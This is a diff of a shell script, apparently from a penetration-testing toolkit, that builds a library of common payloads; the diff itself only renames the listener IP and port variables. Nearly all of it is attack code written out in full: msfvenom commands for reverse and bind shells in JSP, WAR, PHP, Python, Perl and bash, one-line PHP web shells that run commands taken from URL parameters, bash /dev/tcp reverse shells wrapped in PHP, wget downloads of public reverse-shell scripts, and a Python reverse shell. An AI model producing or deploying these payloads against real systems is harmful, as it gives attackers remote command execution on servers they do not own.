@@ -1,43 +1,43 @@
 # Reverse shell
 banner "payloads_common: shell_reverse_tcp.jsp"
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f raw > shell_reverse_tcp.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f raw > shell_reverse_tcp.jsp
 
 banner "payloads_common: shell_reverse_tcp.war"
-msfvenom -p java/shell/reverse_tcp LHOST=$ip_local LPORT=$port_local -f war > shell_reverse_tcp.war
+msfvenom -p java/shell/reverse_tcp LHOST=$source_ip LPORT=$source_port -f war > shell_reverse_tcp.war
 
 banner "payloads_common: shell_reverse_tcp.php"
-msfvenom -p php/reverse_php LHOST=$ip_local LPORT=$port_local -f raw > shell_reverse_tcp.php
+msfvenom -p php/reverse_php LHOST=$source_ip LPORT=$source_port -f raw > shell_reverse_tcp.php
 
 banner "payloads_common: meterpreter_reverse_tcp.php"
-msfvenom -p php/meterpreter_reverse_tcp LHOST=$port_local LPORT=$port_local -f raw > meterpreter_reverse_tcp.php
+msfvenom -p php/meterpreter_reverse_tcp LHOST=$source_port LPORT=$source_port -f raw > meterpreter_reverse_tcp.php
 
 banner "payloads_common: shell_reverse_unix.py"
-msfvenom -p cmd/unix/reverse_python LHOST=$ip_local LPORT=$port_local -f raw > shell_reverse_unix.py
+msfvenom -p cmd/unix/reverse_python LHOST=$source_ip LPORT=$source_port -f raw > shell_reverse_unix.py
 
 banner "payloads_common: shell_reverse_unix.pl"
-msfvenom -p cmd/unix/reverse_perl LHOST=$ip_local LPORT=$port_local -f raw > shell_reverse_unix.pl
+msfvenom -p cmd/unix/reverse_perl LHOST=$source_ip LPORT=$source_port -f raw > shell_reverse_unix.pl
 
 banner "payloads_common: shell_reverse_unix.sh"
-msfvenom -p cmd/unix/reverse_bash LHOST=$ip_local LPORT=$port_local -f raw > shell_reverse_unix.sh
+msfvenom -p cmd/unix/reverse_bash LHOST=$source_ip LPORT=$source_port -f raw > shell_reverse_unix.sh
 
 # Bind shell
 banner "payloads_common: shell_bind_tcp.jsp"
-msfvenom -p java/jsp_shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f raw > shell_bind_tcp.jsp
+msfvenom -p java/jsp_shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f raw > shell_bind_tcp.jsp
 
 banner "payloads_common: shell_bind_tcp.war"
-msfvenom -p java/shell/bind_tcp LPORT=$port_remote -f war > shell_bind_tcp.war
+msfvenom -p java/shell/bind_tcp LPORT=$remote_port -f war > shell_bind_tcp.war
 
 banner "payloads_common: shell_bind_tcp.php"
-msfvenom -p php/bind_php LPORT=$port_remote -f raw > shell_bind_tcp.php
+msfvenom -p php/bind_php LPORT=$remote_port -f raw > shell_bind_tcp.php
 
 banner "payloads_common: meterpreter_bind_tcp.php"
-msfvenom -p php/meterpreter_bind_tcp LPORT=$port_remote -f raw > meterpreter_bind_tcp.php
+msfvenom -p php/meterpreter_bind_tcp LPORT=$remote_port -f raw > meterpreter_bind_tcp.php
 
 banner "payloads_common: shell_bind_unix.py"
-msfvenom -p cmd/unix/bind_python LPORT=$port_remote -f raw > shell_bind_unix.py
+msfvenom -p cmd/unix/bind_python LPORT=$remote_port -f raw > shell_bind_unix.py
 
 banner "payloads_common: shell_bind_unix.pl"
-msfvenom -p cmd/unix/bind_perl LPORT=$port_remote -f raw > shell_bind_unix.pl
+msfvenom -p cmd/unix/bind_perl LPORT=$remote_port -f raw > shell_bind_unix.pl
 
 # exec only returns the last line of the generated output.
 # shell_exec returns the full output of the command, when the command finished running.
@@ -49,8 +49,8 @@ echo '<?php system($_GET["cmd"]); ?>' > system.php
 echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell_exec.php
 echo '<?php passthru($_GET["cmd"]); ?>' > passthru.php
 
-echo "<?php echo shell_exec(\"bash -i >& /dev/tcp/$ip_local/$port_local 0>&1 2>&1\"); ?>" > shell_reverse_tcp.min.php
-echo "<?php echo shell_exec(\"bash -i >& /dev/udp/$ip_local/$port_local 0>&1 2>&1\"); ?>" > shell_reverse_udp.min.php
+echo "<?php echo shell_exec(\"bash -i >& /dev/tcp/$source_ip/$source_port 0>&1 2>&1\"); ?>" > shell_reverse_tcp.min.php
+echo "<?php echo shell_exec(\"bash -i >& /dev/udp/$source_ip/$source_port 0>&1 2>&1\"); ?>" > shell_reverse_udp.min.php
 
 banner "payloads_common: wpes.php - https://github.com/weaknetlabs/wpes"
 wget -N https://raw.githubusercontent.com/weaknetlabs/wpes/master/wpes.php
@@ -84,14 +84,14 @@ rm 1x1%23000000.png
 banner "payloads_common: pentestmonkey-perl-reverse-shell.pl"
 rm pentestmonkey-perl-reverse-shell.pl
 wget https://raw.githubusercontent.com/pentestmonkey/perl-reverse-shell/master/perl-reverse-shell.pl -O pentestmonkey-perl-reverse-shell.pl
-sed -i "s/127.0.0.1/$ip_local/g" pentestmonkey-perl-reverse-shell.pl
-sed -i "s/1234/$port_local/g" pentestmonkey-perl-reverse-shell.pl
+sed -i "s/127.0.0.1/$source_ip/g" pentestmonkey-perl-reverse-shell.pl
+sed -i "s/1234/$source_port/g" pentestmonkey-perl-reverse-shell.pl
 
 banner "payloads_common: pentestmonkey-php-reverse-shell.pl"
 rm pentestmonkey-php-reverse-shell.pl
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O pentestmonkey-php-reverse-shell.pl
-sed -i "s/127.0.0.1/$ip_local/g" pentestmonkey-php-reverse-shell.pl
-sed -i "s/1234/$port_local/g" pentestmonkey-php-reverse-shell.pl
+sed -i "s/127.0.0.1/$source_ip/g" pentestmonkey-php-reverse-shell.pl
+sed -i "s/1234/$source_port/g" pentestmonkey-php-reverse-shell.pl
 
 #wget https://github.com/pentestmonkey/php-findsock-shell/blob/master/findsock.c
 #gcc -o findsock findsock.c
@@ -133,6 +133,6 @@ os.dup2(s.fileno(),2);
 p=subprocess.call(["/bin/sh","-i"]);
 EOT
 
-sed -i "s/127.0.0.1/$ip_local/g" revserse_shell.py
-sed -i "s/4444/$port_local/g" revserse_shell.py
+sed -i "s/127.0.0.1/$source_ip/g" revserse_shell.py
+sed -i "s/4444/$source_port/g" revserse_shell.py
 
